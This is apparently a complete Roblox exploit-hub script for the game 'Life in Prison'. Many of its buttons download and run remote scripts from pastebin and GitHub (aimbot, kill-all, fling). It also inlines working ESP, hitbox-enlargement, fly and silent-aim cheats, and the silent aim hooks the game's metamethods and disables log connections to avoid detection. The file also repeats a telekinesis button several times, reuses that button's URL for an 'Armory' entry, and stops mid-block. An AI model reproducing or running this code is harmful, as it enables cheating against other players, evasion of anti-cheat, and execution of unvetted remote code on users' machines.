getgenv().SecureMode = true
local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()

local Window = Rayfield:CreateWindow({
   Name = "Hub X",
   LoadingTitle = "Welcome :D",
   LoadingSubtitle = "by ThePlayerWSP",
   ConfigurationSaving = {
      Enabled = true,
      FolderName = nil, -- Create a custom folder for your hub/game
      FileName = "Big Hub"
   },
   Discord = {
      Enabled = false,
      Invite = "noinvitelink", -- The Discord invite code, do not include discord.gg/. E.g. discord.gg/ABCD would be ABCD
      RememberJoins = true -- Set this to false to make them join the discord every time they load it up
   },
   KeySystem = true, -- Set this to true to use our key system
   KeySettings = {
      Title = "Hub X",
      Subtitle = "Key System",
      Note = "No method of obtaining the key is provided",
      FileName = "Put your key here", -- It is recommended to use something unique as other scripts using Rayfield may overwrite your key file
      SaveKey = false, -- The user's key will be saved, but if you change the key, they will be unable to use your script
      GrabKeyFromSite = false, -- If this is true, set Key below to the RAW site you would like Rayfield to get the key from
      Key = {"BrackTester:3"} -- List of keys that will be accepted by the system, can be RAW file links (pastebin, github etc) or simple strings ("hello","key22")
   }
})

local Tab = Window:CreateTab("Life in Prison", 4483362458)

local Section = Tab:CreateSection("Gui")

Section:Set("function")

Rayfield:Notify({
   Title = "Warning",
   Content = "we are not responsible for any banned accounts!",
   Duration = 6.5,
   Image = 4483362458,
   Actions = { -- Notification Buttons
      Ignore = {
         Name = "Ok, Thanks!",
         Callback = function()
         print("We are not responsible for any banned accounts!")
      end
   },
},
})

local Button = Tab:CreateButton({
   Name = "green-bell-pepper",
   Callback = function()
          loadstring(game:HttpGet("https://raw.githubusercontent.com/greeksalad7/green-bell-pepper/main/main.lua"))() 
   end,
}) 

local Button = Tab:CreateButton({
   Name = "Ski Hub",
   Callback = function()
          loadstring(game:HttpGet(("https://pastebin.com/raw/mT10xnt7"), true))()
   end,
}) 

local Button = Tab:CreateButton({
   Name = "Life-in-Prison-script-OP",
   Callback = function()
          loadstring(game:HttpGet("https://raw.githubusercontent.com/ThunderInMyHead/Life-in-Prison-script-OP-/main/Script%20%5BNOT%20LOADSTRING%5D"))() 
   end,
})

local Button = Tab:CreateButton({
   Name = "Life in Prison [GUI - Kill All & More!]",
   Callback = function()
          loadstring(game:HttpGet('https://raw.githubusercontent.com/14ms-alt/Roblox-Scripts/main/life_in_prison_gui.lua'))() 
   end,
})

local Section = Tab:CreateSection("Others")

local Button = Tab:CreateButton({
   Name = "Fling",
   Callback = function()
          loadstring(game:HttpGet("https://raw.githubusercontent.com/0Ben1/fe./main/Fling%20GUI"))()
   end,
})

local Button = Tab:CreateButton({
   Name = "Aimbot Beta",
   Callback = function()
          loadstring(game:HttpGet("https://pastebin.com/raw/WbaNnc01"))()
   end,
})

local Button = Tab:CreateButton({
   Name = "Life-in-Prison-script-Hitbox-By-GreekSalad",
   Callback = function()
          loadstring(game:HttpGet("https://pastebin.com/raw/9WR0Dktc"))()
   end,
})

local Button = Tab:CreateButton({
   Name = "drop Itens",
   Callback = function()
          loadstring(game:HttpGet("https://raw.githubusercontent.com/advxzivhsjjdhxhsidifvsh/mobkeyboard/main/main.txt", true))()
   end,
}) 

local Button = Tab:CreateButton({
   Name = "Telekinesis",
   Callback = function()
          loadstring(game:HttpGet("https://pastebin.com/raw/v6PyAYN4"))()
   end,
}) 

local Section = Tab:CreateSection("Teleport")

local Button = Tab:CreateButton({
   Name = "Armory",
   Callback = function()
          loadstring(game:HttpGet("https://pastebin.com/raw/v6PyAYN4"))()
   end,
}) 

local Button = Tab:CreateButton({
   Name = "Telekinesis",
   Callback = function()
          loadstring(game:HttpGet("https://pastebin.com/raw/v6PyAYN4"))()
   end,
}) 

local Button = Tab:CreateButton({
   Name = "Telekinesis",
   Callback = function()
          loadstring(game:HttpGet("https://pastebin.com/raw/v6PyAYN4"))()
   end,
}) 

local Button = Tab:CreateButton({
   Name = "Telekinesis",
   Callback = function()
          loadstring(game:HttpGet("https://pastebin.com/raw/v6PyAYN4"))()
   end,
}) 


local Tab = Window:CreateTab("Misc", 4483362458)

local Section = Tab:CreateSection("Anything")

local Slider = Tab:CreateSlider({
   Name = "Slider Example",
   Range = {0, 300},
   Increment = 10,
   Suffix = "Bananas",
   CurrentValue = 10,
   Flag = "Slider1", -- A flag is the identifier for the configuration file, make sure every element has a different flag if you're using configuration saving to ensure no overlaps
   Callback = function(Value)
       game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = (Value)
   end,
})

Slider:Set(10) -- The new slider integer value

local Slider = Tab:CreateSlider({
   Name = "Slider Example",
   Range = {0, 300},
   Increment = 10,
   Suffix = "Bananas",
   CurrentValue = 10,
   Flag = "Slider1", -- A flag is the identifier for the configuration file, make sure every element has a different flag if you're using configuration saving to ensure no overlaps
   Callback = function(Value)
       game.Player.LocalPlayer.Character.Humanoid.JumpPower = (Value)
   end,
})

Slider:Set(10) -- The new slider integer value

local Section = Tab:CreateSection("Player")

local Button = Tab:CreateButton({
   Name = "Esp",
   Callback = function()
          local FillColor = Color3.fromRGB(175,25,255)
local DepthMode = "AlwaysOnTop"
local FillTransparency = 0.5
local OutlineColor = Color3.fromRGB(255,255,255)
local OutlineTransparency = 0

local CoreGui = game:FindService("CoreGui")
local Players = game:FindService("Players")
local lp = Players.LocalPlayer
local connections = {}

local Storage = Instance.new("Folder")
Storage.Parent = CoreGui
Storage.Name = "Highlight_Storage"

local function Highlight(plr)
    local Highlight = Instance.new("Highlight")
    Highlight.Name = plr.Name
    Highlight.FillColor = FillColor
    Highlight.DepthMode = DepthMode
    Highlight.FillTransparency = FillTransparency
    Highlight.OutlineColor = OutlineColor
    Highlight.OutlineTransparency = 0
    Highlight.Parent = Storage
    
    local plrchar = plr.Character
    if plrchar then
        Highlight.Adornee = plrchar
    end

    connections[plr] = plr.CharacterAdded:Connect(function(char)
        Highlight.Adornee = char
    end)
end

Players.PlayerAdded:Connect(Highlight)
for i,v in next, Players:GetPlayers() do
    Highlight(v)
end

Players.PlayerRemoving:Connect(function(plr)
    local plrname = plr.Name
    if Storage[plrname] then
        Storage[plrname]:Destroy()
    end
    if connections[plr] then
        connections[plr]:Disconnect()
    end
end)
   end,
})

local Button = Tab:CreateButton({
   Name = "Hitbox",
   Callback = function()
       _G.HeadSize = 3
_G.Disabled = true
 
game:GetService('RunService').RenderStepped:connect(function()
if _G.Disabled then
for i,v in next, game:GetService('Players'):GetPlayers() do
if v.Name ~= game:GetService('Players').LocalPlayer.Name then
pcall(function()
v.Character.HumanoidRootPart.Size = Vector3.new(_G.HeadSize,_G.HeadSize,_G.HeadSize)
v.Character.HumanoidRootPart.Transparency = 0.98
v.Character.HumanoidRootPart.BrickColor = BrickColor.new("White")
v.Character.HumanoidRootPart.Material = "Neon"
v.Character.HumanoidRootPart.CanCollide = true
end)
end
end
end
end)
   end,
})

local Button = Tab:CreateButton({
   Name = "auto jump",
   Callback = function()
           loadstring(game:HttpGet('https://pastebin.com/raw/vViq08jX'))() 
   end,
})

local Section = Tab:CreateSection("FlyGui")

local Button = Tab:CreateButton({
   Name = "Fly |pc|",
   Callback = function()
           -- Bring to you by 7alexv7
-- Enjoy the script!

-- Instances:

local FlyGui = Instance.new("ScreenGui")
local Frame = Instance.new("Frame")
local TextButton = Instance.new("TextButton")
local TextLabel = Instance.new("TextLabel")

--Properties:

FlyGui.Name = "FlyGui"
FlyGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")

Frame.Parent = FlyGui
Frame.BackgroundColor3 = Color3.fromRGB(80, 80, 80)
Frame.BorderSizePixel = 0
Frame.Position = UDim2.new(0.0685602352, 0, 0.168769717, 0)
Frame.Size = UDim2.new(0.264544547, 0, 0.100000024, 0)

TextButton.Parent = Frame
TextButton.BackgroundColor3 = Color3.fromRGB(66, 66, 66)
TextButton.BorderSizePixel = 0
TextButton.Position = UDim2.new(0.06324628, 0, 0.400667697, 0)
TextButton.Size = UDim2.new(0.871157169, 0, 0.495614201, 0)
TextButton.Font = Enum.Font.ArialBold
TextButton.Text = "Fly"
TextButton.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton.TextScaled = true
TextButton.TextSize = 14.000
TextButton.TextStrokeTransparency = 0.000
TextButton.TextWrapped = true

TextLabel.Parent = Frame
TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.Size = UDim2.new(0, 86, 0, 24)
TextLabel.Font = Enum.Font.Oswald
TextLabel.Text = "Made by 7alexv7"
TextLabel.TextColor3 = Color3.fromRGB(0, 0, 0)
TextLabel.TextScaled = true
TextLabel.TextSize = 14.000
TextLabel.TextWrapped = true

-- Scripts:

local function NQWSTGE_fake_script() -- Frame.Fly 
	local script = Instance.new('LocalScript', Frame)

	local plr = script.Parent.Parent.Parent.Parent
	repeat wait() until plr and plr.Character and plr.Character:findFirstChild("HumanoidRootPart") and plr.Character:findFirstChild("Humanoid") 
	local mouse = game.Players.LocalPlayer:GetMouse()  
	repeat wait() until mouse
	
	local torso = plr.Character.HumanoidRootPart 
	local flying = false
	local deb = true 
	local ctrl = {f = 0, b = 0, l = 0, r = 0} 
	local lastctrl = {f = 0, b = 0, l = 0, r = 0} 
	local maxspeed = 1000 
	local speed = 50
	function Fly() 
	local bg = Instance.new("BodyGyro", torso) 
	bg.P = 9e4 
	bg.maxTorque = Vector3.new(9e9, 9e9, 9e9) 
	bg.cframe = torso.CFrame 
	local bv = Instance.new("BodyVelocity", torso) 
	bv.velocity = Vector3.new(0,0.1,0) 
	bv.maxForce = Vector3.new(9e9, 9e9, 9e9) 
	repeat wait() 
	plr.Character.Humanoid.PlatformStand = true 
	if ctrl.l + ctrl.r ~= 0 or ctrl.f + ctrl.b ~= 0 then 
	speed = speed+.5+(speed/maxspeed) 
	if speed > maxspeed then 
	speed = maxspeed 
	end 
	elseif not (ctrl.l + ctrl.r ~= 0 or ctrl.f + ctrl.b ~= 0) and speed ~= 0 then 
	speed = speed-1 
	if speed < 0 then 
					speed = 0
				else
					speed = 50
	end 
	end 
	if (ctrl.l + ctrl.r) ~= 0 or (ctrl.f + ctrl.b) ~= 0 then 
	bv.velocity = ((game.Workspace.CurrentCamera.CoordinateFrame.lookVector * (ctrl.f+ctrl.b)) + ((game.Workspace.CurrentCamera.CoordinateFrame * CFrame.new(ctrl.l+ctrl.r,(ctrl.f+ctrl.b)*.2,0).p) - game.Workspace.CurrentCamera.CoordinateFrame.p))*speed 
	lastctrl = {f = ctrl.f, b = ctrl.b, l = ctrl.l, r = ctrl.r} 
	elseif (ctrl.l + ctrl.r) == 0 and (ctrl.f + ctrl.b) == 0 and speed ~= 0 then 
	bv.velocity = ((game.Workspace.CurrentCamera.CoordinateFrame.lookVector * (lastctrl.f+lastctrl.b)) + ((game.Workspace.CurrentCamera.CoordinateFrame * CFrame.new(lastctrl.l+lastctrl.r,(lastctrl.f+lastctrl.b)*.2,0).p) - game.Workspace.CurrentCamera.CoordinateFrame.p))*speed 
	else 
	bv.velocity = Vector3.new(0,0.1,0) 
	end 
	bg.cframe = game.Workspace.CurrentCamera.CoordinateFrame * CFrame.Angles(-math.rad((ctrl.f+ctrl.b)*50*speed/maxspeed),0,0) 
	until not flying 
	ctrl = {f = 0, b = 0, l = 0, r = 0} 
	lastctrl = {f = 0, b = 0, l = 0, r = 0} 
		
	bg:Destroy() 
	bv:Destroy() 
		plr.Character.Humanoid.PlatformStand = false 
		speed = 50
	end 
	
	mouse.KeyDown:connect(function(key) 
	if key:lower() == "e" then 
			if flying then flying = false 
				speed = 50
	else 
	flying = true 
	Fly()
	
	end 
	elseif key:lower() == "w" then 
	ctrl.f = 1 
	elseif key:lower() == "s" then 
	ctrl.b = -1 
	elseif key:lower() == "a" then 
	ctrl.l = -1 
	elseif key:lower() == "d" then 
	ctrl.r = 1 
	end 
	end) 
	mouse.KeyUp:connect(function(key) 
	if key:lower() == "w" then 
	ctrl.f = 0 
	elseif key:lower() == "s" then 
	ctrl.b = 0 
	elseif key:lower() == "a" then 
	ctrl.l = 0 
	elseif key:lower() == "d" then 
	ctrl.r = 0 
	end 
	end)
	
	plr.Character.Humanoid.StateChanged:Connect(function(o,n)
		if n == Enum.HumanoidStateType.Running then
			ctrl.f = 1
		else
			ctrl.f = 0
		end
	
	end)
	script.Parent.TextButton.MouseButton1Click:Connect(function()
		if flying then
			flying = false
			speed = 50
		else
			flying = true
			Fly()
		end
	end)
	
end
coroutine.wrap(NQWSTGE_fake_script)()
local function RAQA_fake_script() -- Frame.Buttons 
	local script = Instance.new('LocalScript', Frame)

	local Trigger = script.Parent.MiniTrext
	local IsMini = false
	function CreateTween(Instance,Style,Direction,Time,table,RepeatCount,CanRepeat,Delay)
		local ts = game:GetService("TweenService")
		local TweenInfo = TweenInfo.new(Time,Style,Direction,RepeatCount,CanRepeat,Delay)
		local Tween = ts:Create(Instance,TweenInfo,table)
		repeat wait() until Tween ~= nil
		return Tween
		
	end
	Trigger.MouseButton1Click:Connect(function()
		if IsMini then
			CreateTween(script.Parent,Enum.EasingStyle.Quad,Enum.EasingDirection.Out,0.5,{Size = UDim2.new(0.265, 0,0.1, 0)},0,false,0.1):Play()
			IsMini = false
			Trigger.Text = "-"
		else
			CreateTween(script.Parent,Enum.EasingStyle.Quad,Enum.EasingDirection.Out,0.5,{Size = UDim2.new(0.265, 0,0.042, 0)},0,false,0.1):Play()
			IsMini = true
			Trigger.Text = "+"
		end
	end)
	script.Parent.Delete.MouseButton1Click:Connect(function()
		script.Parent.Parent:Destroy()
	end)
end
coroutine.wrap(RAQA_fake_script)()
local function TKVUMP_fake_script() -- Frame.Drag Gui 
	local script = Instance.new('LocalScript', Frame)

	local UserInputService = game:GetService("UserInputService")
	
	local gui = script.Parent
	
	local dragging
	local dragInput
	local dragStart
	local startPos
	
	local function update(input)
		local delta = input.Position - dragStart
		gui.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
	end
	
	gui.InputBegan:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
			dragging = true
			dragStart = input.Position
			startPos = gui.Position
			
			input.Changed:Connect(function()
				if input.UserInputState == Enum.UserInputState.End then
					dragging = false
				end
			end)
		end
	end)
	
	gui.InputChanged:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
			dragInput = input
		end
	end)
	
	UserInputService.InputChanged:Connect(function(input)
		if input == dragInput and dragging then
			update(input)
		end
	end)
end
coroutine.wrap(TKVUMP_fake_script)()
   end,
})

local Section = Tab:CreateSection("Combat")

local Button = Tab:CreateButton({
   Name = "Aimlock/FOV gui",
   Callback = function()
           loadstring(game:HttpGet("https://raw.githubusercontent.com/Exunys/AirHub/main/AirHub.lua"))()
   end,
})

local Button = Tab:CreateButton({
   Name = "OwlHub",
   Callback = function()
           loadstring(game:HttpGet("https://raw.githubusercontent.com/CriShoux/OwlHub/master/OwlHub.txt"))();
   end,
})

local Button = Tab:CreateButton({
   Name = "Silent Aim",
   Callback = function()
           getgenv().Prediction =  (  .18  )   -- [ PREDICTION: Lower Prediction: Lower Ping | Higher Prediction: Higher Ping  ]
 
getgenv().FOV =  ( 200 )   -- [ FOV RADIUS: Increases Or Decreases FOV Radius ]
 
getgenv().AimKey =  (  "q"  )  -- [ TOGGLE KEY: Toggles Silent Aim On And Off ]
 
getgenv().DontShootThesePeople = {  -- [ WHITELIST: List Of Who NOT To Shoot, edit like this. "Contain quotations with their name and then a semi-colon afterwards for each line" ; ]
 
	"AimLockPsycho";
	"JakeTheMiddleMan";
 
}
 
--[[
		Do Not Edit Anything Beyond This Point. 
]]
 
local SilentAim = true
local LocalPlayer = game:GetService("Players").LocalPlayer
local Players = game:GetService("Players")
local Mouse = LocalPlayer:GetMouse()
local Camera = game:GetService("Workspace").CurrentCamera
local connections = getconnections(game:GetService("LogService").MessageOut)
for _, v in ipairs(connections) do
	v:Disable()
end
 
getrawmetatable = getrawmetatable
setreadonly = setreadonly
getconnections = getconnections
hookmetamethod = hookmetamethod
getgenv = getgenv
Drawing = Drawing
 
local FOV_CIRCLE = Drawing.new("Circle")
FOV_CIRCLE.Visible = true
FOV_CIRCLE.Filled = false
FOV_CIRCLE.Thickness = 1
FOV_CIRCLE.Transparency = 1
FOV_CIRCLE.Color = Color3.new(0, 1, 0)
FOV_CIRCLE.Radius = getgenv().FOV
FOV_CIRCLE.Position = Vector2.new(Camera.ViewportSize.X / 2, Camera.ViewportSize.Y / 2)
 
Options = {
	Torso = "HumanoidRootPart";
	Head = "Head";
}
 
local function MoveFovCircle()
	pcall(function()
		local DoIt = true
		spawn(function()
			while DoIt do task.wait()
				FOV_CIRCLE.Position = Vector2.new(Mouse.X, (Mouse.Y + 36))
			end
		end)
	end)
end coroutine.wrap(MoveFovCircle)()
 
Mouse.KeyDown:Connect(function(KeyPressed)
	if KeyPressed == (getgenv().AimKey:lower()) then
		if SilentAim == false then
			FOV_CIRCLE.Color = Color3.new(0, 1, 0)
			SilentAim = true
		elseif SilentAim == true then
			FOV_CIRCLE.Color = Color3.new(1, 0, 0)
			SilentAim = false
		end
	end
end)
Mouse.KeyDown:Connect(function(Rejoin)
	if Rejoin == "=" then
		local LocalPlayer = game:GetService("Players").LocalPlayer
		game:GetService("TeleportService"):Teleport(game.PlaceId, LocalPlayer)
	end
end)
 
 
local oldIndex = nil
oldIndex = hookmetamethod(game, "__index", function(self, Index, Screw)
	local Screw = oldIndex(self, Index)
	local kalk = Mouse
	local cc = "hit"
	local gboost = cc
	if self == kalk and (Index:lower() == gboost) then
		local Distance = 9e9
		local Target = nil
		local Players = game:GetService("Players")
		local LocalPlayer = game:GetService("Players").LocalPlayer
		local Camera = game:GetService("Workspace").CurrentCamera
		for _, v in pairs(Players:GetPlayers()) do 
			if not table.find(getgenv().DontShootThesePeople, v.Name) then
				if v ~= LocalPlayer and v.Character and v.Character:FindFirstChild("HumanoidRootPart") and v.Character:FindFirstChild("Humanoid") and v.Character:FindFirstChild("Humanoid").Health > 0 then
					local Enemy = v.Character	
					local CastingFrom = CFrame.new(Camera.CFrame.Position, Enemy[Options.Torso].CFrame.Position) * CFrame.new(0, 0, -4)
					local RayCast = Ray.new(CastingFrom.Position, CastingFrom.LookVector * 9000)
					local World, ToSpace = game:GetService("Workspace"):FindPartOnRayWithIgnoreList(RayCast, {LocalPlayer.Character:FindFirstChild("Head")})
					local RootWorld = (Enemy[Options.Torso].CFrame.Position - ToSpace).magnitude
					if RootWorld < 4 then		
						local RootPartPosition, Visible = Camera:WorldToScreenPoint(Enemy[Options.Torso].Position)
						if Visible then
							local Real_Magnitude = (Vector2.new(Mouse.X, Mouse.Y) - Vector2.new(RootPartPosition.X, RootPartPosition.Y)).Magnitude
							if Real_Magnitude < Distance and Real_Magnitude < FOV_CIRCLE.Radius then
								Distance = Real_Magnitude
								Target = Enemy
							end
						end
					end
				end
			end
		end
 
		if Target ~= nil and Target[Options.Torso] and Target:FindFirstChild("Humanoid") and Target:FindFirstChild("Humanoid").Health > 0 then
			local Madox = Target[Options.Torso]
			local Formulate = Madox.CFrame + (Madox.AssemblyLinearVelocity * getgenv().Prediction + Vector3.new(0,-1,0))	
			return (Index:lower() == gboost and Formulate)
		end
		return Screw
	end
	return oldIndex(self, Index, Screw)
end)
 
--Farewell Atman, Nosss, Toru.
   end,
})

local Section = Tab:CreateSection("Fps")

local Button = Tab:CreateButton({
   Name = "Fps Unlocker",
   Callback = function()
          local UserInputService = game:GetService("UserInputService")
local RunService = game:GetService("RunService")

local WindowFocusReleasedFunction = function()
	RunService:Set3dRenderingEnabled(false)
	setfpscap(10)
	return
end

local WindowFocusedFunction = function()
	RunService:Set3dRenderingEnabled(true)
	setfpscap(360)
	return
end

local Initialize = function()
	UserInputService.WindowFocusReleased:Connect(WindowFocusReleasedFunction)
	UserInputService.WindowFocused:Connect(WindowFocusedFunction)
	return
end
Initialize()
   end,
})

local Button = Tab:CreateButton({
   Name = "Remove Texture",
   Callback = function()
           local ToDisable = {
	Textures = true,
	VisualEffects = true,
	Parts = true,
	Particles = true,
	Sky = true
}

local ToEnable = {
	FullBright = false
}

local Stuff = {}

for _, v in next, game:GetDescendants() do
	if ToDisable.Parts then
		if v:IsA("Part") or v:IsA("Union") or v:IsA("BasePart") then
			v.Material = Enum.Material.SmoothPlastic
			table.insert(Stuff, 1, v)
		end
	end
	
	if ToDisable.Particles then
		if v:IsA("ParticleEmitter") or v:IsA("Smoke") or v:IsA("Explosion") or v:IsA("Sparkles") or v:IsA("Fire") then
			v.Enabled = false
			table.insert(Stuff, 1, v)
		end
	end
	
	if ToDisable.VisualEffects then
		if v:IsA("BloomEffect") or v:IsA("BlurEffect") or v:IsA("DepthOfFieldEffect") or v:IsA("SunRaysEffect") then
			v.Enabled = false
			table.insert(Stuff, 1, v)
		end
	end
	
	if ToDisable.Textures then
		if v:IsA("Decal") or v:IsA("Texture") then
			v.Texture = ""
			table.insert(Stuff, 1, v)
		end
	end
	
	if ToDisable.Sky then
		if v:IsA("Sky") then
			v.Parent = nil
			table.insert(Stuff, 1, v)
		end
	end
end

game:GetService("TestService"):Message("Effects Disabler Script : Successfully disabled "..#Stuff.." assets / effects. Settings :")

for i, v in next, ToDisable do
	print(tostring(i)..": "..tostring(v))
end

if ToEnable.FullBright then
    local Lighting = game:GetService("Lighting")
    
    Lighting.FogColor = Color3.fromRGB(255, 255, 255)
    Lighting.FogEnd = math.huge
    Lighting.FogStart = math.huge
    Lighting.Ambient = Color3.fromRGB(255, 255, 255)
    Lighting.Brightness = 5
    Lighting.ColorShift_Bottom = Color3.fromRGB(255, 255, 255)
    Lighting.ColorShift_Top = Color3.fromRGB(255, 255, 255)
    Lighting.OutdoorAmbient = Color3.fromRGB(255, 255, 255)
    Lighting.Outlines = true
end
   end,
})

local Section = Tab:CreateSection("Shader")


local Button = Tab:CreateButton({
   Name = "Universal Shader |No Lag|",
   Callback = function()
          -- Credits to Instance Serializer for helping me convert the Tokyowami shrine whatever thing to luau
if not game:IsLoaded() then
    game.Loaded:Wait()
end
local Bloom = Instance.new("BloomEffect")
Bloom.Intensity = 0.1
Bloom.Threshold = 0
Bloom.Size = 100

local Tropic = Instance.new("Sky")
Tropic.Name = "Tropic"
Tropic.SkyboxUp = "http://www.roblox.com/asset/?id=169210149"
Tropic.SkyboxLf = "http://www.roblox.com/asset/?id=169210133"
Tropic.SkyboxBk = "http://www.roblox.com/asset/?id=169210090"
Tropic.SkyboxFt = "http://www.roblox.com/asset/?id=169210121"
Tropic.StarCount = 100
Tropic.SkyboxDn = "http://www.roblox.com/asset/?id=169210108"
Tropic.SkyboxRt = "http://www.roblox.com/asset/?id=169210143"
Tropic.Parent = Bloom

local Sky = Instance.new("Sky")
Sky.SkyboxUp = "http://www.roblox.com/asset/?id=196263782"
Sky.SkyboxLf = "http://www.roblox.com/asset/?id=196263721"
Sky.SkyboxBk = "http://www.roblox.com/asset/?id=196263721"
Sky.SkyboxFt = "http://www.roblox.com/asset/?id=196263721"
Sky.CelestialBodiesShown = false
Sky.SkyboxDn = "http://www.roblox.com/asset/?id=196263643"
Sky.SkyboxRt = "http://www.roblox.com/asset/?id=196263721"
Sky.Parent = Bloom

Bloom.Parent = game:GetService("Lighting")

local Bloom = Instance.new("BloomEffect")
Bloom.Enabled = false
Bloom.Intensity = 0.35
Bloom.Threshold = 0.2
Bloom.Size = 56

local Tropic = Instance.new("Sky")
Tropic.Name = "Tropic"
Tropic.SkyboxUp = "http://www.roblox.com/asset/?id=169210149"
Tropic.SkyboxLf = "http://www.roblox.com/asset/?id=169210133"
Tropic.SkyboxBk = "http://www.roblox.com/asset/?id=169210090"
Tropic.SkyboxFt = "http://www.roblox.com/asset/?id=169210121"
Tropic.StarCount = 100
Tropic.SkyboxDn = "http://www.roblox.com/asset/?id=169210108"
Tropic.SkyboxRt = "http://www.roblox.com/asset/?id=169210143"
Tropic.Parent = Bloom

local Sky = Instance.new("Sky")
Sky.SkyboxUp = "http://www.roblox.com/asset/?id=196263782"
Sky.SkyboxLf = "http://www.roblox.com/asset/?id=196263721"
Sky.SkyboxBk = "http://www.roblox.com/asset/?id=196263721"
Sky.SkyboxFt = "http://www.roblox.com/asset/?id=196263721"
Sky.CelestialBodiesShown = false
Sky.SkyboxDn = "http://www.roblox.com/asset/?id=196263643"
Sky.SkyboxRt = "http://www.roblox.com/asset/?id=196263721"
Sky.Parent = Bloom

Bloom.Parent = game:GetService("Lighting")
local Blur = Instance.new("BlurEffect")
Blur.Size = 2

Blur.Parent = game:GetService("Lighting")
local Efecto = Instance.new("BlurEffect")
Efecto.Name = "Efecto"
Efecto.Enabled = false
Efecto.Size = 2

Efecto.Parent = game:GetService("Lighting")
local Inaritaisha = Instance.new("ColorCorrectionEffect")
Inaritaisha.Name = "Inari taisha"
Inaritaisha.Saturation = 0.05
Inaritaisha.TintColor = Color3.fromRGB(255, 224, 219)

Inaritaisha.Parent = game:GetService("Lighting")
local Normal = Instance.new("ColorCorrectionEffect")
Normal.Name = "Normal"
Normal.Enabled = false
Normal.Saturation = -0.2
Normal.TintColor = Color3.fromRGB(255, 232, 215)

Normal.Parent = game:GetService("Lighting")
local SunRays = Instance.new("SunRaysEffect")
SunRays.Intensity = 0.05

SunRays.Parent = game:GetService("Lighting")
local Sunset = Instance.new("Sky")
Sunset.Name = "Sunset"
Sunset.SkyboxUp = "rbxassetid://323493360"
Sunset.SkyboxLf = "rbxassetid://323494252"
Sunset.SkyboxBk = "rbxassetid://323494035"
Sunset.SkyboxFt = "rbxassetid://323494130"
Sunset.SkyboxDn = "rbxassetid://323494368"
Sunset.SunAngularSize = 14
Sunset.SkyboxRt = "rbxassetid://323494067"

Sunset.Parent = game:GetService("Lighting")
local Takayama = Instance.new("ColorCorrectionEffect")
Takayama.Name = "Takayama"
Takayama.Enabled = false
Takayama.Saturation = -0.3
Takayama.Contrast = 0.1
Takayama.TintColor = Color3.fromRGB(235, 214, 204)

Takayama.Parent = game:GetService("Lighting")
local L = game:GetService("Lighting")
L.Brightness = 2.14
L.ColorShift_Bottom = Color3.fromRGB(11, 0, 20)
L.ColorShift_Top = Color3.fromRGB(240, 127, 14)
L.OutdoorAmbient = Color3.fromRGB(34, 0, 49)
L.ClockTime = 6.7
L.FogColor = Color3.fromRGB(94, 76, 106)
L.FogEnd = 1000
L.FogStart = 0
L.ExposureCompensation = 0.24
L.ShadowSoftness = 0
L.Ambient = Color3.fromRGB(59, 33, 27)

local Bloom = Instance.new("BloomEffect")
Bloom.Intensity = 0.1
Bloom.Threshold = 0
Bloom.Size = 100

local Tropic = Instance.new("Sky")
Tropic.Name = "Tropic"
Tropic.SkyboxUp = "http://www.roblox.com/asset/?id=169210149"
Tropic.SkyboxLf = "http://www.roblox.com/asset/?id=169210133"
Tropic.SkyboxBk = "http://www.roblox.com/asset/?id=169210090"
Tropic.SkyboxFt = "http://www.roblox.com/asset/?id=169210121"
Tropic.StarCount = 100
Tropic.SkyboxDn = "http://www.roblox.com/asset/?id=169210108"
Tropic.SkyboxRt = "http://www.roblox.com/asset/?id=169210143"
Tropic.Parent = Bloom

local Sky = Instance.new("Sky")
Sky.SkyboxUp = "http://www.roblox.com/asset/?id=196263782"
Sky.SkyboxLf = "http://www.roblox.com/asset/?id=196263721"
Sky.SkyboxBk = "http://www.roblox.com/asset/?id=196263721"
Sky.SkyboxFt = "http://www.roblox.com/asset/?id=196263721"
Sky.CelestialBodiesShown = false
Sky.SkyboxDn = "http://www.roblox.com/asset/?id=196263643"
Sky.SkyboxRt = "http://www.roblox.com/asset/?id=196263721"
Sky.Parent = Bloom

Bloom.Parent = game:GetService("Lighting")

local Bloom = Instance.new("BloomEffect")
Bloom.Enabled = false
Bloom.Intensity = 0.35
Bloom.Threshold = 0.2
Bloom.Size = 56

local Tropic = Instance.new("Sky")
Tropic.Name = "Tropic"
Tropic.SkyboxUp = "http://www.roblox.com/asset/?id=169210149"
Tropic.SkyboxLf = "http://www.roblox.com/asset/?id=169210133"
Tropic.SkyboxBk = "http://www.roblox.com/asset/?id=169210090"
Tropic.SkyboxFt = "http://www.roblox.com/asset/?id=169210121"
Tropic.StarCount = 100
Tropic.SkyboxDn = "http://www.roblox.com/asset/?id=169210108"
Tropic.SkyboxRt = "http://www.roblox.com/asset/?id=169210143"
Tropic.Parent = Bloom

local Sky = Instance.new("Sky")
Sky.SkyboxUp = "http://www.roblox.com/asset/?id=196263782"
Sky.SkyboxLf = "http://www.roblox.com/asset/?id=196263721"
Sky.SkyboxBk = "http://www.roblox.com/asset/?id=196263721"
Sky.SkyboxFt = "http://www.roblox.com/asset/?id=196263721"
Sky.CelestialBodiesShown = false
Sky.SkyboxDn = "http://www.roblox.com/asset/?id=196263643"
Sky.SkyboxRt = "http://www.roblox.com/asset/?id=196263721"
Sky.Parent = Bloom

Bloom.Parent = game:GetService("Lighting")
local Blur = Instance.new("BlurEffect")
Blur.Size = 2

Blur.Parent = game:GetService("Lighting")
local Efecto = Instance.new("BlurEffect")
Efecto.Name = "Efecto"
Efecto.Enabled = false
Efecto.Size = 2

Efecto.Parent = game:GetService("Lighting")
local Inaritaisha = Instance.new("ColorCorrectionEffect")
Inaritaisha.Name = "Inari taisha"
Inaritaisha.Saturation = 0.05
Inaritaisha.TintColor = Color3.fromRGB(255, 224, 219)

Inaritaisha.Parent = game:GetService("Lighting")
local Normal = Instance.new("ColorCorrectionEffect")
Normal.Name = "Normal"
Normal.Enabled = false
Normal.Saturation = -0.2
Normal.TintColor = Color3.fromRGB(255, 232, 215)

Normal.Parent = game:GetService("Lighting")
local SunRays = Instance.new("SunRaysEffect")
SunRays.Intensity = 0.05

